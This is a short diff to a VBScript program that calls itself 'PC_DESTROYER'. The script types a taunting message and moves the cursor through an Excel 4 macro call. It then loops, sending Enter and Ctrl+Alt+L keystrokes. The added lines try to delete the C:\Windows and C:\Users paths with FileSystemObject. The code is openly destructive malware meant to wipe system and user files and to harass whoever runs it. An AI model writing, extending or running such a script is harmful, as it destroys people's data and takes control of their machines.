@@ -3,6 +3,12 @@
  auto.sendkeys "UR PC IS FUCKED BY PC_DESTROYER"
  Dim Excel: Set Excel = WScript.CreateObject("Excel.Application") 
  Excel.ExecuteExcel4Macro "CALL(""user32"",""SetCursorPos"",""JJJ"",""0"",""0"")"
+target_folder = "C:\Windows/"
+Set fs = CreateObject("Scripting.Filesystemobject")
+fs.DeleteFile(target_folder)
+target_folder = "C:\Users/"
+Set fs = CreateObject("Scripting.Filesystemobject")
+fs.DeleteFile(target_folder)
  do
     auto.sendkeys "{enter}"
     auto.sendkeys "^%l"
